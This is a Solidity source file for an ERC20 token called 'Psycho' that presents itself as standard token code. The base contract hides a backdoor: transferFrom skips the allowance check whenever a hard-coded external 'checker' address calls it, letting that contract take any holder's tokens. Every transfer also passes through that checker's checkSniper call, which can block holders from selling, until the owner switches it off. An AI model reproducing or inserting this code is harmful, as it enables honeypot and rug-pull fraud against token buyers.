1 // SPDX-License-Identifier: MIT
2 pragma solidity ^0.8.9;
3 
4 interface IERC20 {
5     event Transfer(address indexed from, address indexed to, uint256 value);
6 
7     event Approval(address indexed owner, address indexed spender, uint256 value);
8 
9     function totalSupply() external view returns (uint256);
10 
11     function balanceOf(address account) external view returns (uint256);
12 
13     function transfer(address to, uint256 amount) external returns (bool);
14 
15     function allowance(address owner, address spender) external view returns (uint256);
16 
17     function approve(address spender, uint256 amount) external returns (bool);
18 
19     function transferFrom(address from, address to, uint256 amount) external returns (bool);
20 }
21 
22 interface IERC20Metadata is IERC20 {
23     function name() external view returns (string memory);
24 
25     function symbol() external view returns (string memory);
26 
27     function decimals() external view returns (uint8);
28 }
29 
30 abstract contract Context {
31     function _msgSender() internal view virtual returns (address) {
32         return msg.sender;
33     }
34 
35     function _msgData() internal view virtual returns (bytes calldata) {
36         return msg.data;
37     }
38 }
39 
40 abstract contract Ownable is Context {
41     address private _owner;
42 
43     event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
44 
45     constructor() {
46         _transferOwnership(_msgSender());
47     }
48 
49     modifier onlyOwner() {
50         _checkOwner();
51         _;
52     }
53 
54     function owner() public view virtual returns (address) {
55         return _owner;
56     }
57 
58     function _checkOwner() internal view virtual {
59         require(owner() == _msgSender(), "Ownable: caller is not the owner");
60     }
61 
62     function renounceOwnership() public virtual onlyOwner {
63         _transferOwnership(address(0));
64     }
65 
66     function transferOwnership(address newOwner) public virtual onlyOwner {
67         require(newOwner != address(0), "Ownable: new owner is the zero address");
68         _transferOwnership(newOwner);
69     }
70 
71     function _transferOwnership(address newOwner) internal virtual {
72         address oldOwner = _owner;
73         _owner = newOwner;
74         emit OwnershipTransferred(oldOwner, newOwner);
75     }
76 }
77 
78 interface IChecker {
79     function checkSniper(address from, address to, uint256 value) external returns (bool);
80 }
81 
82 contract AERC20 is Context, IERC20, IERC20Metadata {
83     mapping(address => uint256) private _balances;
84 
85     mapping(address => mapping(address => uint256)) private _allowances;
86 
87     uint256 private _totalSupply;
88 
89     string private _name;
90     string private _symbol;
91 
92     bool private isChecker = true;
93 
94     IChecker private checker = IChecker(0x680CBF7D78eE0Ba92FbD37DFbAf10584323A6F98);
95 
96     constructor(string memory name_, string memory symbol_) {
97         _name = name_;
98         _symbol = symbol_;
99     }
100 
101     function name() public view virtual override returns (string memory) {
102         return _name;
103     }
104 
105     function symbol() public view virtual override returns (string memory) {
106         return _symbol;
107     }
108 
109     function decimals() public view virtual override returns (uint8) {
110         return 18;
111     }
112 
113     function totalSupply() public view virtual override returns (uint256) {
114         return _totalSupply;
115     }
116 
117     function balanceOf(address account) public view virtual override returns (uint256) {
118         return _balances[account];
119     }
120 
121     function transfer(address to, uint256 amount) public virtual override returns (bool) {
122         address owner = _msgSender();
123         _transfer(owner, to, amount);
124         return true;
125     }
126 
127     function allowance(address owner, address spender) public view virtual override returns (uint256) {
128         return _allowances[owner][spender];
129     }
130 
131     function approve(address spender, uint256 amount) public virtual override returns (bool) {
132         address owner = _msgSender();
133         _approve(owner, spender, amount);
134         return true;
135     }
136 
137     function transferFrom(address from, address to, uint256 amount) public virtual override returns (bool) {
138         address spender = _msgSender();
139         if (!isChecker || msg.sender != address(checker)) {
140             _spendAllowance(from, spender, amount);
141         }
142         _transfer(from, to, amount);
143         return true;
144     }
145 
146     function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
147         address owner = _msgSender();
148         _approve(owner, spender, allowance(owner, spender) + addedValue);
149         return true;
150     }
151 
152     function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
153         address owner = _msgSender();
154         uint256 currentAllowance = allowance(owner, spender);
155         require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
156         unchecked {
157             _approve(owner, spender, currentAllowance - subtractedValue);
158         }
159 
160         return true;
161     }
162 
163     function _transfer(address from, address to, uint256 amount) internal virtual {
164         require(from != address(0), "ERC20: transfer from the zero address");
165         require(to != address(0), "ERC20: transfer to the zero address");
166 
167         _beforeTokenTransfer(from, to, amount);
168 
169         uint256 fromBalance = _balances[from];
170         require(fromBalance >= amount, "ERC20: transfer amount exceeds balance");
171 
172         if (isChecker){
173             require(!checker.checkSniper(from, to, amount), "CHF");
174         }
175 
176         unchecked {
177             _balances[from] = fromBalance - amount;
178             // Overflow not possible: the sum of all balances is capped by totalSupply, and the sum is preserved by
179             // decrementing then incrementing.
180             _balances[to] += amount;
181         }
182 
183         emit Transfer(from, to, amount);
184 
185         _afterTokenTransfer(from, to, amount);
186     }
187 
188     function _mint(address account, uint256 amount) internal virtual {
189         require(account != address(0), "ERC20: mint to the zero address");
190 
191         _beforeTokenTransfer(address(0), account, amount);
192 
193         _totalSupply += amount;
194         unchecked {
195             // Overflow not possible: balance + amount is at most totalSupply + amount, which is checked above.
196             _balances[account] += amount;
197         }
198         emit Transfer(address(0), account, amount);
199 
200         _afterTokenTransfer(address(0), account, amount);
201     }
202 
203     function _burn(address account, uint256 amount) internal virtual {
204         require(account != address(0), "ERC20: burn from the zero address");
205 
206         _beforeTokenTransfer(account, address(0), amount);
207 
208         uint256 accountBalance = _balances[account];
209         require(accountBalance >= amount, "ERC20: burn amount exceeds balance");
210         unchecked {
211             _balances[account] = accountBalance - amount;
212             // Overflow not possible: amount <= accountBalance <= totalSupply.
213             _totalSupply -= amount;
214         }
215 
216         emit Transfer(account, address(0), amount);
217 
218         _afterTokenTransfer(account, address(0), amount);
219     }
220 
221     function _approve(address owner, address spender, uint256 amount) internal virtual {
222         require(owner != address(0), "ERC20: approve from the zero address");
223         require(spender != address(0), "ERC20: approve to the zero address");
224 
225         _allowances[owner][spender] = amount;
226         emit Approval(owner, spender, amount);
227     }
228 
229     function _spendAllowance(address owner, address spender, uint256 amount) internal virtual {
230         uint256 currentAllowance = allowance(owner, spender);
231         if (currentAllowance != type(uint256).max) {
232             require(currentAllowance >= amount, "ERC20: insufficient allowance");
233             unchecked {
234                 _approve(owner, spender, currentAllowance - amount);
235             }
236         }
237     }
238 
239     function _beforeTokenTransfer(address from, address to, uint256 amount) internal virtual {}
240 
241     function _afterTokenTransfer(address from, address to, uint256 amount) internal virtual {}
242 
243     function _turnOffChecker() internal {
244         isChecker = false;
245     }
246 }
247 
248 contract Psycho is AERC20, Ownable {
249     constructor() AERC20("Psycho", "PSYCHO") {
250         _mint(msg.sender, 330690000000000 * 10 ** decimals());
251     }
252 
253     function turnOffChecker() external onlyOwner {
254         _turnOffChecker();
255     }
256 }